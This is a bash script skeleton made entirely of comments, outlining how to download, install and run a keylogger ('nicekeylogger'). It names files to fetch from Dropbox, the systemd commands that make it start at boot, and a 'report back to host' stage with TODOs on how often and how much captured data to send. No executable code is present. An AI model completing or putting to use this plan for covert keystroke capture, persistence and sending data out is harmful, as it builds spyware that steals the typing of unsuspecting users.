#!/bin/bash
# application to install, setup, and run the keylogger.

# dl.dropboxusercontent.com prepends/replaces www.dropbox.com for direct download
# wget?

# DOWNLOAD FILES if they are not already installed
# nicekeylogger.service, controller.py, find_keyboard.py, keymap.py


# SET APPLICATION AS A SERVICE WITH SYSTEMD
# copy nicekeylogger.service to /etc/systemd/system/
# systemctl enable nicekeylogger.service
# systemctl daemon-reload


# RUN APPLICATION


# REPORT BACK TO HOST
# TODO - decide the period to report back
# TODO - control size of report; only send new content? only send UDP payload? On size == x?

